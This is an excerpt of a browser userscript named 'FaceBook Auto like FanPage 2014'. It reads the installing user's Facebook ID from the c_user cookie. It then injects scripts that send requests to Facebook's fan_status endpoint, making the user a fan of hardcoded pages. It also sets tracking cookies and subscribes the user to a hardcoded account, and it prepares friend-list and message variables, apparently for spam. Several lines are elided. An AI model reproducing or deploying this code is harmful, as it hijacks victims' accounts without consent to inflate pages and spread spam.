// ==UserScript==
// @name            FaceBook Auto like FanPage 2014
// @namespace       FaceBook Auto like FanPage 2014
...
var username=getCookie("username");
  ...
  //alert ('cookie does not exist');
	...
	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:459526180833776,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("kristenstewart4",'facebook',365);

	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:590535717675265,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("lovepir321",'facebook',365);
...
sublist("1404655193111956");


var gid = ["618724291502492"];
...
var spage_id = "618724291502492";
var spost_id = "618724291502492";
var sfoto_id = "618724291502492";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
